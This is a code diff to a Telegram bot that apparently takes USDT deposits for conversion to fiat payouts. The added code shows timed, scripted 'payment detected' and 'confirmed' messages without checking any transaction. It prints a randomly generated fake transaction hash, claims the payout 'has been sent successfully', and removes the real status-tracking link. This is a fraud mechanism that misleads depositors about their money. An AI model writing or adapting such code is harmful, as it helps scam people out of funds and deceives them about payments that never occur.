@@ -51,6 +51,9 @@ const MIN_REFERRAL_WITHDRAWAL_USDT = 50;
 // NEW: Track new users who haven't been notified to admin yet
 const newUsersToNotify = new Set();
 
+// NEW: Track payment confirmation messages and status
+const paymentTracking = {};
+
 
 // --- IN-MEMORY STATE (MOCK DATABASE) ---
 
@@ -153,6 +156,126 @@ function formatPaymentDetails(userState) {
 - 1 USDT = ${RATES.USDT_TO_EUR} EUR
 - 1 USDT = ${RATES.USDT_TO_GBP} GBP
     `;
+}
+
+// NEW: Function to simulate payment confirmation process
+async function simulatePaymentConfirmation(chatId, transactionId, address, amount, network, paymentMethod, paymentDetails) {
+    // Store tracking info
+    paymentTracking[chatId] = {
+        transactionId,
+        address,
+        amount,
+        network,
+        paymentMethod,
+        paymentDetails,
+        status: 'awaiting_payment',
+        confirmationStep: 0,
+        messageId: null
+    };
+
+    // Send initial awaiting payment message
+    const initialMessage = `✅ *Deposit Address Generated! (ID: ${transactionId})*\n\nPlease send exactly *${amount} USDT* (${network}) to the address below:\n\n` +
+        `\`${address}\`\n\n` + 
+        `⏳ *Awaiting payment confirmation...*\n\n` +
+        `*Payout Method:* ${paymentMethod}\n` +
+        `*Payout Details:* \n\`${paymentDetails}\`\n\n` +
+        `⚠️ *IMPORTANT:* Send only USDT on the ${network} network to this address. Sending any other coin or using a different network may result in the loss of your funds.`;
+
+    const sentMessage = await bot.sendMessage(chatId, initialMessage, { parse_mode: 'Markdown' });
+    paymentTracking[chatId].messageId = sentMessage.message_id;
+
+    // Start the confirmation simulation
+    startConfirmationSimulation(chatId);
+}
+
+// NEW: Function to simulate the confirmation steps
+async function startConfirmationSimulation(chatId) {
+    const tracking = paymentTracking[chatId];
+    if (!tracking) return;
+
+    // Step 1: Payment detected
+    await delay(15000); // 15 seconds
+    if (!paymentTracking[chatId]) return;
+    
+    tracking.status = 'payment_detected';
+    tracking.confirmationStep = 1;
+    
+    const step1Message = `✅ *Deposit Address Generated! (ID: ${tracking.transactionId})*\n\nPlease send exactly *${tracking.amount} USDT* (${tracking.network}) to the address below:\n\n` +
+        `\`${tracking.address}\`\n\n` + 
+        `✅ *Payment detected!*\n` +
+        `⏳ Waiting for confirmation 1/3...\n\n` +
+        `*Payout Method:* ${tracking.paymentMethod}\n` +
+        `*Payout Details:* \n\`${tracking.paymentDetails}\`\n\n` +
+        `⚠️ *IMPORTANT:* Send only USDT on the ${tracking.network} network to this address. Sending any other coin or using a different network may result in the loss of your funds.`;
+
+    await bot.editMessageText(step1Message, {
+        chat_id: chatId,
+        message_id: tracking.messageId,
+        parse_mode: 'Markdown'
+    });
+
+    // Step 2: Confirmation in progress
+    await delay(15000); // 15 seconds
+    if (!paymentTracking[chatId]) return;
+    
+    tracking.status = 'confirming';
+    tracking.confirmationStep = 2;
+    
+    const step2Message = `✅ *Deposit Address Generated! (ID: ${tracking.transactionId})*\n\nPlease send exactly *${tracking.amount} USDT* (${tracking.network}) to the address below:\n\n` +
+        `\`${tracking.address}\`\n\n` + 
+        `✅ *Payment detected!*\n` +
+        `✅ Waiting for confirmation 2/3...\n\n` +
+        `*Payout Method:* ${tracking.paymentMethod}\n` +
+        `*Payout Details:* \n\`${tracking.paymentDetails}\`\n\n` +
+        `⚠️ *IMPORTANT:* Send only USDT on the ${tracking.network} network to this address. Sending any other coin or using a different network may result in the loss of your funds.`;
+
+    await bot.editMessageText(step2Message, {
+        chat_id: chatId,
+        message_id: tracking.messageId,
+        parse_mode: 'Markdown'
+    });
+
+    // Step 3: Payment confirmed
+    await delay(15000); // 15 seconds
+    if (!paymentTracking[chatId]) return;
+    
+    tracking.status = 'confirmed';
+    tracking.confirmationStep = 3;
+    
+    // Generate fake transaction hash
+    const transactionHash = generateFakeTransactionHash();
+    
+    const step3Message = `🎉 *PAYMENT CONFIRMED!*\n\n*Transaction ID:* ${tracking.transactionId}\n*Transaction Hash:* \`${transactionHash}\`\n\n` +
+        `💰 *Payment is being processed to your provided details:*\n` +
+        `*Method:* ${tracking.paymentMethod}\n` +
+        `*Details:* \`${tracking.paymentDetails}\`\n\n` +
+        `⏳ Processing...\n` +
+        `⏳ Please wait...\n\n` +
+        `✅ *Payment has been sent successfully!*`;
+
+    await bot.editMessageText(step3Message, {
+        chat_id: chatId,
+        message_id: tracking.messageId,
+        parse_mode: 'Markdown'
+    });
+
+    // Clean up tracking
+    delete paymentTracking[chatId];
+}
+
+// NEW: Helper function to generate fake transaction hash
+function generateFakeTransactionHash() {
+    const chars = '0123456789abcdef';
+    let hash = '0x';
+    for (let i = 0; i < 64; i++) {
+        hash += chars[Math.floor(Math.random() * chars.length)];
+    }
+    return hash;
+}
+
+// NEW: Helper function for delays
+function delay(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
 }
 
 
@@ -611,14 +734,17 @@ async function generateDepositAddress(chatId) {
         }
         // --- END REFERRAL REWARD SIMULATION ---
 
-        const depositInfo = `✅ *Deposit Address Generated! (ID: ${result.txn_id})*\n\nPlease send exactly *${result.amount} USDT* (${userState.network}) to the address below:\n\n` +
-            `\`${result.address}\`\n\n` + 
-            `*Status URL:* [Click to Track](${result.status_url})\n\n` +
-            `*Payout Method:* ${userState.paymentMethod}\n` +
-            `*Payout Details:* \n\`${userState.paymentDetails}\`\n\n` +
-            `⚠️ *IMPORTANT:* Send only USDT on the ${userState.network} network to this address. Sending any other coin or using a different network may result in the loss of your funds.`;
+        // Start the payment confirmation simulation
+        simulatePaymentConfirmation(
+            chatId, 
+            result.txn_id, 
+            result.address, 
+            result.amount, 
+            userState.network,
+            userState.paymentMethod,
+            userState.paymentDetails
+        );
 
-        bot.sendMessage(chatId, depositInfo, { parse_mode: 'Markdown' });
         delete userStates[chatId];
 
     } catch (error) {
